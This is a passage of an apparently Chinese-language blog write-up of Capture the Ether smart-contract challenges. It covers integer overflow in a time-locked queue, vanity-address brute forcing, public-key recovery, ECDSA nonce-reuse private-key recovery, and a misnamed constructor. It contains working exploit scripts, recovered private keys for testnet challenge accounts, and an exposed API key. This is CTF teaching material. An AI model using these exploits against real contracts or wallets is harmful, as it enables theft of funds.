+= queue[i].amount;</span><br><span class="line"></span><br><span class="line">            // Reclaim storage.</span><br><span class="line">            delete queue[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Move the head of the queue forward so we don&apos;t have to loop over</span><br><span class="line">        // already-withdrawn contributions.</span><br><span class="line">        head = index + 1;</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(total);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=tR-qQcNT_fY" target="_blank" rel="noopener">100 Years</a>. I guess just listen to half of it.</p>
<p>价值2000point的最后一道题，想起来确实比较麻烦。首先和上面一行还是有一个未初始化的洞，【这里是比较奇怪的，在upsert的else分支里面，甚至都没有声明contribution变量，但是却可以用，可能是solidity的一个特性吧，因为我把if分支里面的声明去掉之后，else分支里的才报变量未声明的错误】</p>
<p>结构体有两个变量，然后前两个slot存的是queue数组的长度和head。</p>
<p>题目完成的条件还是获取合约里面所有的钱，取钱函数只有withdraw，需要owner（没事，我们本来就是了），还有一个限制就是当前时间得大于queue数组里面最后一个结构体里标记的时间。而在合约部署的时候里面就在queue里放了第一个结构体，amount是1 eth，解锁时间是50年后，然后你每加一个快，新块的解锁时间至少要比最后一个块解锁时间长一天。</p>
<p>来看一下这个upsert的函数，当你想加一个块的时候，首先你的index得是大于1的，不然就是改原来的块了。然后第一个参数是value，value同时是会改变数组的length的，然后是timestamp。然后再push这个结构体入数组的时候，会有几个操作。首先他会过去当前数组的length值oldlength，然后给newlength = oldlength + 1，（测试出来的，底层估计得去看看黄皮书啥的？），然后再存到相应的slot上（具体这里应该是 slot_(keccak256(uint(0)) + oldlength)。所以注意道，如果你value给0wei，那么oldlength就是0，就会把你queue里头那个有 1 eth 的结构体给抹掉了。（这可不行！）并且此时head的值也会是你的timestamp，那么在withdraw的时候也会出点问题（因为是从head 取到index），，啊啊啊啊，好烦。</p>
<p>注意到这里对新解锁日期的要求是大于最后一个块的解锁日期的一天，用的是 + 1 days，其实也就是 + 24 * 3600，那么这里可以存在上溢啊。我们新加一个块，日期是 2^256 - 24 * 3600，然后再加下一个块的日期就可以是 0 了，并且head也能是0，取款的时候也能取到那个 1 eth了。</p>
<p>那value怎么传呢，传0 wei就会把第一个覆盖掉了，所以传 1 wei，就会push到后面一个块了。然后传 2 wei，就能再往后面push一个块。那么三个块分别是</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">----------       ---------------------         ---------</span><br><span class="line">|<span class="string">1 eth   </span>|<span class="string">       </span>|<span class="string"> 2 wei             </span>|<span class="string">         </span>|<span class="string"> 3 wei </span>|</span><br><span class="line">|<span class="string">now     </span>|<span class="string">   - &gt; </span>|<span class="string"> 2^256 - 24 * 3600 </span>|<span class="string">   - &gt;   </span>|<span class="string"> 0     </span>|</span><br><span class="line">----------       ---------------------         ---------</span><br></pre></td></tr></table></figure>

<p>然后withdraw，index给到 2，因为index = 2 的块的解锁时间是 0 ，题目就会把从 head：0 到 index: 2里所有的钱都拿出来了。但是一个问题就是，这里一共是 1eth 5 wei，但合约里应该只有 1 eth 3 wei。差了两wei（为啥给 1 wei 会变成 2 wei，给 2 wei 会变成 3 wei，因为是push这个操作给加了1）</p>
<p>那么，一个想法是再用上面的自爆合约，给这个合约转个 2 wei就够了。</p>
<p>或者，加第二次块的时候，还是传 1 wei，此时新的块会直接把第二个块给代替掉</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">----------       ---------</span><br><span class="line">|<span class="string">1 eth   </span>|<span class="string">       </span>|<span class="string"> 2 wei </span>|</span><br><span class="line">|<span class="string">now     </span>|<span class="string">   - &gt; </span>|<span class="string"> 0     </span>|</span><br><span class="line">----------        ---------</span><br></pre></td></tr></table></figure>

<p>合约里刚好也只有 1 eth 2 wei，就能成功全部转出来了。</p>
<h1 id="Accounts"><a href="#Accounts" class="headerlink" title="Accounts"></a>Accounts</h1><p>These challenges test your understanding of Ethereum accounts.</p>
<h2 id="Fuzzy-identity"><a href="#Fuzzy-identity" class="headerlink" title="Fuzzy identity"></a>Fuzzy identity</h2><p>This contract can only be used by me (smarx). I don’t trust myself to remember my private key, so I’ve made it so whatever address I’m using in the future will work:</p>
<ol>
<li>I always use a wallet contract that returns “smarx” if you ask its <code>name</code>.</li>
<li>Everything I write has bad code in it, so my address always includes the hex string <code>badc0de</code>.</li>
</ol>
<p>To complete this challenge, steal my identity!</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface IName &#123;</span><br><span class="line">    function name() external view returns (bytes32);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FuzzyIdentityChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(isSmarx(msg.sender));</span><br><span class="line">        require(isBadCode(msg.sender));</span><br><span class="line"></span><br><span class="line">        isComplete = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSmarx(address addr) internal view returns (bool) &#123;</span><br><span class="line">        return IName(addr).name() == bytes32(&quot;smarx&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isBadCode(address _addr) internal pure returns (bool) &#123;</span><br><span class="line">        bytes20 addr = bytes20(_addr);</span><br><span class="line">        bytes20 id = hex&quot;000000000000000000000000000000000badc0de&quot;;</span><br><span class="line">        bytes20 mask = hex&quot;000000000000000000000000000000000fffffff&quot;;</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; 34; i++) &#123;</span><br><span class="line">            if (addr &amp; mask == id) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            mask &lt;&lt;= 4;</span><br><span class="line">            id &lt;&lt;= 4;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=8wxBLq_C2KQ" target="_blank" rel="noopener">Research Me Obsessively</a>.</p>
<p>这道题要求一个合约地址包含一个name函数，会返回bytes32(“smarx”)，然后该合约的地址要包含”badc0de“。主要是后面这个要求比较麻烦。</p>
<p>用的pizza师傅博客里的<a href="https://hitcxy.com/2020/generate-address/" target="_blank" rel="noopener">jio本</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo apt-get install libssl-dev build-essential automake pkg-config libtool libffi-dev libgmp-dev</span></span><br><span class="line"><span class="comment"># python3 -m pip install ethereum -i https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ethereum <span class="keyword">import</span> utils</span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate EOA with the ability to deploy contract with appendix 1b1b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_eoa2</span><span class="params">()</span>:</span></span><br><span class="line">    priv = utils.sha3(os.urandom(<span class="number">4096</span>))</span><br><span class="line">    addr = utils.checksum_encode(utils.privtoaddr(priv))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="string">"badc0de"</span> <span class="keyword">not</span> <span class="keyword">in</span> utils.decode_addr(utils.mk_contract_address(addr, <span class="number">0</span>)):</span><br><span class="line">        priv = utils.sha3(os.urandom(<span class="number">4096</span>))</span><br><span class="line">        addr = utils.checksum_encode(utils.privtoaddr(priv))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print(<span class="string">'Address: &#123;&#125;\nPrivate Key: &#123;&#125;'</span>.format(addr, priv.hex()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">generate_eoa2()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">'Address: &#123;&#125;\nPrivate Key: &#123;&#125;'</span>.format(addr, priv.hex()))</span><br><span class="line">Address: <span class="number">0x92Ae9Fb8D0556d3f723791a3217B3704EC69910b</span></span><br><span class="line">Private Key: d8c99a88d0a42098ebde25a873bf86340f1fd794a8f4ded1779d7c3728c57372</span><br></pre></td></tr></table></figure>

<p>（爆这个全靠人品了，我同时跑了四个，这一个爆出来后一个小时另外三个还没反应。。。</p>
<p>然后用这个账户部署攻击合约</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract pwn&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">pwn1</span><span class="params">()</span> <span class="title">public</span></span>&#123;</span><br><span class="line">        FuzzyIdentityChallenge fuzzy = FuzzyIdentityChallenge(<span class="number">0xCF0847ec71F66D22E18c62EFDA6A739eef7DA7a8</span>);</span><br><span class="line">        fuzzy.authenticate();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">()</span> <span class="title">public</span> <span class="title">returns</span><span class="params">(bytes32)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> bytes32(<span class="string">"smarx"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Public-Key"><a href="#Public-Key" class="headerlink" title="Public Key"></a>Public Key</h2><p>Recall that an address is the last 20 bytes of the keccak-256 hash of the address’s public key.</p>
<p>To complete this challenge, find the public key for the <code>owner</code>‘s account.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PublicKeyChallenge &#123;</span><br><span class="line">    address owner = 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate(bytes publicKey) public &#123;</span><br><span class="line">        require(address(keccak256(publicKey)) == owner);</span><br><span class="line"></span><br><span class="line">        isComplete = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=Qp9JriLfH1w" target="_blank" rel="noopener">Public Key Infrastructure</a>.</p>
<p>这个就是计算一下这个地址的公钥。</p>
<p>地址是由公钥hash来的，那肯定是不能反推回去的，我们看看这个账户上的交易，因为交易信息肯定是有用公钥签名的。从交易信息恢复私钥是不行，恢复个公钥应该还是可以的。</p>
<p><img src="https://s2.loli.net/2022/03/07/Gwzuqla7TV2Iiyj.png" alt="image-20220307193059699.png"></p>
<p>刚好有一个out的交易，去getTransaction一下：await web3.eth.getTransaction(“0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb”)</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">blockHash:</span> <span class="string">"0x487183cd9eed0970dab843c9ebd577e6af3e1eb7c9809d240c8735eab7cb43de"</span></span><br><span class="line"><span class="symbol">blockNumber:</span> <span class="number">3015083</span></span><br><span class="line"><span class="symbol">from:</span> <span class="string">"0x92b28647Ae1F3264661f72fb2eB9625A89D88A31"</span></span><br><span class="line"><span class="symbol">gas:</span> <span class="number">90000</span></span><br><span class="line"><span class="symbol">gasPrice:</span> <span class="string">"1000000000"</span></span><br><span class="line"><span class="symbol">hash:</span> <span class="string">"0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb"</span></span><br><span class="line"><span class="symbol">input:</span> <span class="string">"0x5468616e6b732c206d616e21"</span></span><br><span class="line"><span class="symbol">nonce:</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">r:</span> <span class="string">"0xa5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7"</span></span><br><span class="line"><span class="symbol">s:</span> <span class="string">"0x5710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962"</span></span><br><span class="line"><span class="symbol">to:</span> <span class="string">"0x6B477781b0e68031109f21887e6B5afEAaEB002b"</span></span><br><span class="line"><span class="symbol">transactionIndex:</span> <span class="number">7</span></span><br><span class="line"><span class="symbol">type:</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">v:</span> <span class="string">"0x29"</span></span><br><span class="line"><span class="symbol">value:</span> <span class="string">"0"</span></span><br></pre></td></tr></table></figure>

<p>然后用js现成的库去恢复</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">const EthereumTx = require('ethereumjs-tx').Transaction;</span><br><span class="line">const util = require('ethereumjs-util');</span><br><span class="line"></span><br><span class="line">var rawTx = &#123;</span><br><span class="line">  nonce: '0x00',</span><br><span class="line">  gasPrice: '0x3b9aca00',</span><br><span class="line">  gasLimit: '0x15f90',</span><br><span class="line">  to: '0x6B<span class="number">477781</span>b0e<span class="number">68031109</span>f<span class="number">2188</span>7e6B5afEAaEB002b',</span><br><span class="line">  value: '0x00',</span><br><span class="line">  data: '0x<span class="number">546861</span>6e6b732c206d616e21',</span><br><span class="line">  v: '0x29',</span><br><span class="line">  r: '0xa<span class="number">552271</span>8c0f95dde27f<span class="number">0827</span>f55de<span class="number">836342</span>ceda594d<span class="number">20458523</span>dd71a539d52ad7',</span><br><span class="line">  s: '0x<span class="number">5710</span>e<span class="number">6431</span>1d<span class="number">481764</span>b5ae8ca691b05d<span class="number">14054782</span>c7d489f<span class="number">3511</span>a7abf2f<span class="number">507896</span>2'</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var tx = new EthereumTx(rawTx,&#123; chain: 'ropsten'&#125;);</span><br><span class="line"></span><br><span class="line">pubkey=tx.getSenderPublicKey();</span><br><span class="line">pubkeys=pubkey.toString('hex');</span><br><span class="line">var address = util.keccak256(pubkey).toString('hex').slice(<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">console.<span class="built_in">log</span>(pubkeys);</span><br><span class="line">console.<span class="built_in">log</span>(address);</span><br></pre></td></tr></table></figure>

<p>得到公钥613a8d23bd34f7e568ef4eb1f68058e77620e40079e88f705dfb258d7a06a1a0364dbe56cab53faf26137bec044efd0b07eec8703ba4a31c588d9d94c35c8db4</p>
<h2 id="Account-Takeover"><a href="#Account-Takeover" class="headerlink" title="Account Takeover"></a>Account Takeover</h2><p>To complete this challenge, send a transaction from the <code>owner</code>‘s account.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract AccountTakeoverChallenge &#123;</span><br><span class="line">    address owner = 0x6B477781b0e68031109f21887e6B5afEAaEB002b;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        isComplete = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=GBkT19uH2RQ" target="_blank" rel="noopener">Pinky and The Brain Intro</a>.</p>
<p>代码量越来越少了属于是，要求你获取0x6B477781b0e68031109f21887e6B5afEAaEB002b的私钥了就。</p>
<p>肯定还是要从他发出的交易入手了。</p>
<p>注意到这个账户发出的交易太多了，etherscan直接查的话最前面的交易就查不到了。所以这里用了一下api</p>
<p><a href="https://api-ropsten.etherscan.io/api?module=account&amp;action=txlist&amp;address=0x6B477781b0e68031109f21887e6B5afEAaEB002b&amp;startblock=0&amp;endblock=99999999&amp;page=1&amp;offset=10&amp;sort=asc&amp;apikey=NBV1N4K1Z1JIIN766SEZ78P619FK43ZA74" target="_blank" rel="noopener">https://api-ropsten.etherscan.io/api?module=account&amp;action=txlist&amp;address=0x6B477781b0e68031109f21887e6B5afEAaEB002b&amp;startblock=0&amp;endblock=99999999&amp;page=1&amp;offset=10&amp;sort=asc&amp;apikey=NBV1N4K1Z1JIIN766SEZ78P619FK43ZA74</a></p>
<p>注意到这个账号的第一个和第二个交易</p>
<p><img src="https://s2.loli.net/2022/03/07/hJySr5pmj8s9LVX.png" alt="2_T_3T@KBT7`_DZV2_U_7B4.png"></p>
<p>去getTransaction会发现</p>
<p><img src="https://s2.loli.net/2022/03/07/XAgzIPaUBRV2iO7.png" alt="123"></p>
<p>这两个交易的签名用了同一个r，签名算法采用的是ECDSA，所以这里是临时密钥的复用，而临时密钥的复用是回导致私钥被计算出来的。这里我们首先用生成消息的hash，</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">const EthereumTx = require('ethereumjs-tx').Transaction;</span><br><span class="line">var rawTx1 =</span><br><span class="line">    &#123; nonce: <span class="number">0</span>,</span><br><span class="line">     gasPrice: '0x3b9aca00',</span><br><span class="line">     gasLimit: '0x<span class="number">5208</span>',</span><br><span class="line">     to: '0x92b<span class="number">2864</span>7ae1f<span class="number">326466</span>1f72fb2eb<span class="number">9625</span>a89d88a31',</span><br><span class="line">     value: '0x<span class="number">1111</span>d67bb1bb<span class="number">0000</span>',</span><br><span class="line">     data: '0x',</span><br><span class="line">     v: <span class="number">41</span>,</span><br><span class="line">     r: '0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba<span class="number">387606167166</span>',</span><br><span class="line">     s: '0x<span class="number">7724</span>cedeb923f374bef4e05c<span class="number">9742</span>6a<span class="number">918123</span>cc4fec7b<span class="number">07903839</span>f<span class="number">1251</span>7e1b3c8'</span><br><span class="line">&#125;</span><br><span class="line">var rawTx2 =</span><br><span class="line">    &#123; nonce: <span class="number">1</span>,</span><br><span class="line">     gasPrice: '0x3b9aca00',</span><br><span class="line">     gasLimit: '0x<span class="number">5208</span>',</span><br><span class="line">     to: '0x92b<span class="number">2864</span>7ae1f<span class="number">326466</span>1f72fb2eb<span class="number">9625</span>a89d88a31',</span><br><span class="line">     value: '0x<span class="number">1922</span>e95bca330e00',</span><br><span class="line">     data: '0x',</span><br><span class="line">     v: <span class="number">41</span>,</span><br><span class="line">     r: '0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba<span class="number">387606167166</span>',</span><br><span class="line">     s: '0x2bbd9c2a<span class="number">6285</span>c2b43e728b17bda36a<span class="number">8165</span>3dd5f<span class="number">4612</span>a2e0aefdb<span class="number">4804</span>3c<span class="number">5108</span>de'</span><br><span class="line">&#125;</span><br><span class="line">tx1 = new EthereumTx(rawTx1,&#123; chain: 'ropsten'&#125;);</span><br><span class="line"></span><br><span class="line">tx2 = new EthereumTx(rawTx2,&#123; chain: 'ropsten'&#125;);</span><br><span class="line"></span><br><span class="line">z1=tx1.hash(false).toString(<span class="string">"hex"</span>);</span><br><span class="line">z2=tx2.hash(false).toString(<span class="string">"hex"</span>);</span><br><span class="line">console.<span class="built_in">log</span>(z1);</span><br><span class="line">console.<span class="built_in">log</span>(z2);</span><br></pre></td></tr></table></figure>

<p>然后根据算法进行一个私钥的计算</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number <span class="built_in">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def derivate_privkey(p, r, s1, s2, z1, z2):</span><br><span class="line">    <span class="attr">z</span> = z1 - z2</span><br><span class="line">    <span class="attr">s</span> = s1 - s2</span><br><span class="line">    <span class="attr">r_inv</span> = inverse(r, p)</span><br><span class="line">    <span class="attr">s_inv</span> = inverse(s, p)</span><br><span class="line">    <span class="attr">k</span> = (z * s_inv) % p</span><br><span class="line">    <span class="attr">d</span> = (r_inv * (s1 * k - z1)) % p</span><br><span class="line">    return d, k</span><br><span class="line"></span><br><span class="line"><span class="attr">z1</span> = <span class="number">0</span>x4f6a8370a435a27724bbc163419042d71b6dcbeb61c060cc6816cda93f57860c</span><br><span class="line"><span class="attr">s1</span> = <span class="number">0</span>x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de</span><br><span class="line"><span class="attr">r</span> = <span class="number">0</span>x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166</span><br><span class="line"><span class="attr">z2</span> = <span class="number">0</span>x350f3ee8007d817fbd7349c477507f923c4682b3e69bd1df5fbb93b39beb1e04</span><br><span class="line"><span class="attr">s2</span> = <span class="number">0</span>x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8</span><br><span class="line"></span><br><span class="line"><span class="attr">p</span>  = <span class="number">0</span>xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 </span><br><span class="line"></span><br><span class="line">print(<span class="string">"privatekey:%x\n k:%x"</span> % derivate_privkey(p,r,s1,s2,z1,z2))</span><br></pre></td></tr></table></figure>

<p>获得私钥 614f5e36cd55ddab0947d1723693fef5456e5bee24738ba90bd33c0c6e68e269</p>
<h1 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h1><h2 id="Assume-ownership"><a href="#Assume-ownership" class="headerlink" title="Assume ownership"></a>Assume ownership</h2><p>To complete this challenge, become the <code>owner</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract AssumeOwnershipChallenge &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function AssumeOwmershipChallenge() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        isComplete = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=ytc4_JJWqMQ" target="_blank" rel="noopener">Owner Of A Lonely Heart</a>.</p>
<p>乍一看这一题好像是 Account Takeover 好像差不多，也要搞到题目部署者的私钥？</p>
<p>但其实这是solidity 0.4.x 版本才会出现的问题了。0.4.x 版本默认和合约名一样的函数为构造函数，仅在部署的时候运行一次。但注意到题目的AssumeOwmershipChallenge()函数，虽然和合约名很像，但其实中间是有一个字符不一样的。再加上public标签。所以这其实是一个任何账户都可以调用的函数。</p>
<p>因此我们直接调用AssumeOwmershipChallenge()函数便可以成为owner，完成解题了。</p>
<h2 id="Token-bank"><a href="#Token-bank" class="headerlink" title="Token bank"></a>Token bank</h2><p>I created a token bank. It allows anyone to deposit tokens by transferring them to the bank and then to withdraw those tokens later. It uses <a href="https://github.com/ethereum/EIPs/issues/223" target="_blank" rel="noopener">ERC 223</a> to accept the incoming tokens.</p>
<p>The bank deploys a token called “Simple ERC223 Token” and assigns half the tokens to me and half to you. You win this challenge if you can empty the bank.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span 